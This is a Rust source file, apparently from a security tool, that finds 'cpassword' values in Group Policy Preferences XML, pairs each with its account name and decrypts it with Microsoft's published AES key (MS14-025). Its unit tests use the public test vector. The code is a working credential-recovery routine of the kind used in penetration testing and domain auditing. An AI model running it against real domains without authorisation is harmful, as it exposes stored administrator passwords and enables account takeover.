//! GPP cpassword crypto + XML extraction. The AES-256 key below is the one Microsoft
//! published in MS-GPPREF; it is identical on every domain, which is exactly why GPP
//! passwords are considered plaintext-equivalent (MS14-025).

use aes::Aes256;
use anyhow::{bail, Result};
use base64::{engine::general_purpose::STANDARD, Engine};
use cbc::cipher::{block_padding::NoPadding, BlockDecryptMut, KeyIvInit};

/// The public MS-GPPREF AES-256 key.
const GPP_KEY: [u8; 32] = [
    0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
    0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
];
const GPP_IV: [u8; 16] = [0u8; 16];

type Aes256CbcDec = cbc::Decryptor<Aes256>;

/// Decrypt a base64 `cpassword` value to its plaintext (UTF-16LE inside).
pub fn decrypt_cpassword(cpassword: &str) -> Result<String> {
    // GPP base64 often lacks trailing padding.
    let mut s = cpassword.trim().to_string();
    while s.len() % 4 != 0 {
        s.push('=');
    }
    let mut data = STANDARD.decode(s.as_bytes())?;
    if data.is_empty() || data.len() % 16 != 0 {
        bail!("cpassword length {} is not an AES block multiple", data.len());
    }

    let pt = Aes256CbcDec::new(&GPP_KEY.into(), &GPP_IV.into())
        .decrypt_padded_mut::<NoPadding>(&mut data)
        .map_err(|e| anyhow::anyhow!("AES-CBC decrypt: {e:?}"))?;

    // Strip PKCS7 padding applied over the UTF-16LE bytes.
    let mut bytes = pt.to_vec();
    if let Some(&pad) = bytes.last() {
        let pad = pad as usize;
        if (1..=16).contains(&pad) && pad <= bytes.len() {
            bytes.truncate(bytes.len() - pad);
        }
    }

    let units: Vec<u16> = bytes.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
    Ok(String::from_utf16_lossy(&units).trim_end_matches('\0').to_string())
}

/// Find every non-empty `cpassword="..."` in an XML document, paired with the nearest
/// account attribute on the same element (userName / newName / accountName / name).
pub fn extract_cpasswords(xml: &str) -> Vec<(String, Option<String>)> {
    const NEEDLE: &str = "cpassword=\"";
    let mut out = Vec::new();
    let mut idx = 0;
    while let Some(pos) = xml[idx..].find(NEEDLE) {
        let at = idx + pos;
        let start = at + NEEDLE.len();
        let Some(end_rel) = xml[start..].find('"') else { break };
        let value = &xml[start..start + end_rel];
        if !value.is_empty() {
            out.push((value.to_string(), find_account_attr(xml, at)));
        }
        idx = start + end_rel + 1;
    }
    out
}

fn find_account_attr(xml: &str, cpassword_pos: usize) -> Option<String> {
    let elem_start = xml[..cpassword_pos].rfind('<').unwrap_or(0);
    let window = &xml[elem_start..cpassword_pos];
    for attr in ["userName=\"", "newName=\"", "accountName=\"", "name=\""] {
        if let Some(p) = window.find(attr) {
            let s = p + attr.len();
            if let Some(e) = window[s..].find('"') {
                let v = &window[s..s + e];
                if !v.is_empty() {
                    return Some(v.to_string());
                }
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    // Canonical MS14-025 test vector.
    #[test]
    fn decrypts_known_cpassword() {
        let pw = decrypt_cpassword("j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw").unwrap();
        assert_eq!(pw, "Local*P4ssword!");
    }

    #[test]
    fn extracts_user_and_cpassword_from_groups_xml() {
        let xml = r#"<Groups><User><Properties action="U" userName="Administrator (built-in)"
            cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changeLogon="0"/></User></Groups>"#;
        let hits = extract_cpasswords(xml);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].1.as_deref(), Some("Administrator (built-in)"));
        assert_eq!(decrypt_cpassword(&hits[0].0).unwrap(), "Local*P4ssword!");
    }

    #[test]
    fn ignores_empty_cpassword() {
        assert!(extract_cpasswords(r#"<X cpassword=""/>"#).is_empty());
    }
}
